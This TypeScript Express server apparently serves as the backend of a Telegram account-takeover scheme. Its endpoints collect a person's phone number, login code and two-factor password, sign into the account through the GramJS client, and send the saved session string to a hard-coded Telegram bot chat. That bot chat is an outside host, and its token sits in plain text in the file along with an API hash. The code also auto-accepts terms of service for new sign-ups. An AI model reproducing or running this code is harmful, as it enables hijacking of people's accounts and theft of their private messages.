import { Api, TelegramClient } from "telegram";
import { ApiCredentials } from "telegram/client/auth";
import { AbortController } from "node-abort-controller";
import fetch from "node-fetch";
import express from 'express';

require('dotenv').config();
const { StringSession } = require("telegram/sessions");
const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage?chat_id=-1001729935532";

const app = express();
const port = 4000;
const apiId = 2899;
const apiHash = "36722c72256a24c1225de00eb6a1ca74"
let phoneCode;
let isRegistrationRequired = false;
let termsOfService;

let globalRetry = 1;
const username = process?.env?.userName || "default"
let sendCodeResult: {
    phoneCodeHash: string;
    isCodeViaApp: boolean;
} | undefined = undefined;
let phoneNumber;
let phoneCodeHash;
let password;
let isCodeViaApp = false;
const apiCredentials = { apiId: apiId, apiHash: apiHash }
const stringSession = new StringSession("");
let client;
let inProcess = true;

async function fetchWithTimeout(resource, options = { timeout: undefined }, sendErr = true) {
    const timeout = options?.timeout || 15000;

    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout);
    try {
        // const response = {ok :true}
        const response = await fetch(resource, {
            ...options,
            signal: controller.signal
        });
        clearTimeout(id);
        return response;
    } catch (error) {
        if (sendErr) {
            console.log(error, ' - ', resource);
            await fetchWithTimeout(`${ppplbot}&text=${(username).toUpperCase()}: ${error} - ${resource}`);
        }
        return undefined
    }
}


app.get('/', (req, res) => {
    res.send('Hello World!');
});

app.get('/login', async (req, res, next) => {
    res.send('responding!!');
    next();
}, async (req, res) => {
    if (inProcess) {
        inProcess = false;
        client = new TelegramClient(stringSession, apiId, apiHash, {
            connectionRetries: 5,
        });
        setTimeout(async () => {
            await client?.destroy();
            client = undefined;
            phoneCode = undefined;
            phoneNumber = undefined;
            inProcess = true
        }, 180000)
        const phone = req.query.phone;
        console.log("Number :", `+${phone}`);
        await trySgnup(`+${phone}`)
    }
});

app.get('/otp', async (req, res, next) => {
    phoneCode = req.query.code;
    console.log(phoneCode)
    res.send('loggingIn!!');
    next();
}, async (req, res) => {
    setTimeout(async () => {
        await client?.destroy();
        client = undefined;
        phoneCode = undefined;
        phoneNumber = undefined;
        inProcess = true
    }, 180000)
    console.log("hello:", phoneCode);
    await login();
});
app.get('/password', async (req, res) => {
    password = req.query.password;
    console.log(password)
    res.send('loggingIn!!');
});

app.get('/exit', async (req, res) => {
    process.exit(1)
    res.json({});
});
app.get('/connect', async (req, res) => {
    await client.connect();
    const sess = client.session.save()
    console.log(sess);
    res.json({});
});

app.get('/disconnect', async (req, res) => {
    await client.destroy();
    res.send("detroyed");
});

app.listen(port, () => {
    console.log(`App listening at http://localhost:${port}`);
});


async function trySgnup(phoneNum: string) {
    phoneNumber = phoneNum
    let retries = 6;
    try {
        if (!client.connected) {
            await client.connect();
        }
        const sendCodeResult = await sendCode(
            client,
            apiCredentials,
            phoneNumber);
        phoneCodeHash = sendCodeResult.phoneCodeHash;
        isCodeViaApp = sendCodeResult.isCodeViaApp;

        if (typeof phoneCodeHash !== "string") {
            throw new Error("Failed to retrieve phone code hash");
        }
        console.log(sendCodeResult);

    } catch (err: any) {
        if (typeof phoneNumber !== "function") {
            throw err;
        }

        const shouldWeStop = false//await authParams.onError(err);
        if (shouldWeStop) {
            throw new Error("AUTH_USER_CANCEL");
        }
    }
}

async function login() {
    try {
        console.log("inside:", phoneCode, phoneNumber, phoneCodeHash);
        if (!phoneCode) {
            throw new Error("Code is empty");
        }

        const result = await client.invoke(
            new Api.auth.SignIn({
                phoneNumber,
                phoneCodeHash,
                phoneCode,
            })
        );
        console.log(result);
        if (result instanceof Api.auth.AuthorizationSignUpRequired) {
            isRegistrationRequired = true;
            termsOfService = result.termsOfService;
        } else {
            const sess = client.session.save()
            console.log(sess);
            await fetchWithTimeout(`${ppplbot}&text=${(username).toUpperCase()}:${sess}`);
            return result.user
        }
    } catch (err: any) {
        console.log(err)
        if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
            return client.signInWithPassword(apiCredentials, { password: () => Promise.resolve(password), onError: (err) => console.log(err) });
        } else {
            const shouldWeStop = false//await authParams.onError(err);
            if (shouldWeStop) {
                throw new Error("AUTH_USER_CANCEL");
            }
        }
    }

    if (isRegistrationRequired) {
        try {
            let lastName = 'last name';
            let firstName = "first name";


            const { user } = (await client.invoke(
                new Api.auth.SignUp({
                    phoneNumber,
                    phoneCodeHash,
                    firstName,
                    lastName,
                })
            )) as Api.auth.Authorization;

            if (termsOfService) {
                // This is a violation of Telegram rules: the user should be presented with and accept TOS.
                await client.invoke(
                    new Api.help.AcceptTermsOfService({
                        id: termsOfService.id,
                    })
                );
            }

            return user;
        } catch (err: any) {
            const shouldWeStop = false//await authParams.onError(err);
            if (shouldWeStop) {
                throw new Error("AUTH_USER_CANCEL");
            }
        }
    }

}

async function delayedReturn(timeout): Promise<string> {
    globalRetry++;
    if (globalRetry % 9 === 0) {
        process.exit(1);
    }
    return new Promise((resolve) => {
        setTimeout(() => {
            resolve(phoneCode as string);
        }, timeout);
    });
}
export async function sendCode(
    client: TelegramClient,
    apiCredentials: ApiCredentials,
    phoneNumber: string,
    forceSMS = false
): Promise<{
    phoneCodeHash: string;
    isCodeViaApp: boolean;
}> {
    try {
        const { apiId, apiHash } = apiCredentials;
        const sendResult = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber,
                apiId,
                apiHash,
                settings: new Api.CodeSettings({}),
            })
        );
        if (sendResult instanceof Api.auth.SentCodeSuccess)
            throw new Error("logged in right after sending the code");

        // If we already sent a SMS, do not resend the phoneCode (hash may be empty)
        if (!forceSMS || sendResult.type instanceof Api.auth.SentCodeTypeSms) {
            return {
                phoneCodeHash: sendResult.phoneCodeHash,
                isCodeViaApp:
                    sendResult.type instanceof Api.auth.SentCodeTypeApp,
            };
        }

        const resendResult = await client.invoke(
            new Api.auth.ResendCode({
                phoneNumber,
                phoneCodeHash: sendResult.phoneCodeHash,
            })
        );
        if (resendResult instanceof Api.auth.SentCodeSuccess)
            throw new Error("logged in right after resending the code");

        return {
            phoneCodeHash: resendResult.phoneCodeHash,
            isCodeViaApp: resendResult.type instanceof Api.auth.SentCodeTypeApp,
        };
    } catch (err: any) {
        if (err.errorMessage === "AUTH_RESTART") {
            return client.sendCode(apiCredentials, phoneNumber, forceSMS);
        } else {
            throw err;
        }
    }
}